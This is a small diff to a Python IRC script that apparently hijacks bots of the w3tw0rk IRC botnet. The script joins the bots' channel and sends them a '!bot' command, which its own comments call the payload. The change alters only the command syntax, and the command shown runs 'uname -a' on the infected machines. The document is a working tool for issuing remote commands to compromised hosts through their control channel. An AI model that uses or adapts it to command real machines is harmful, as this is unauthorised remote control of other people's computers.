@@ -25,7 +25,7 @@ def main(argv):
     irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :I eat w3tw0rk bots!\n") #user authentication
     irc.send("NICK "+ botnick +"\n") #sets nick
     irc.send("JOIN "+ channel +"\n") #join the chan
-    irc.send("PRIVMSG "+channel+" :!bot @system 'uname -a' \n") #send the payload to the bot
+    irc.send("PRIVMSG "+channel+" :!bot 'uname -a' \n") #send the payload to the bot
 
     while 1:    #puts it in a loop
         text=irc.recv(2040)  #receive the text
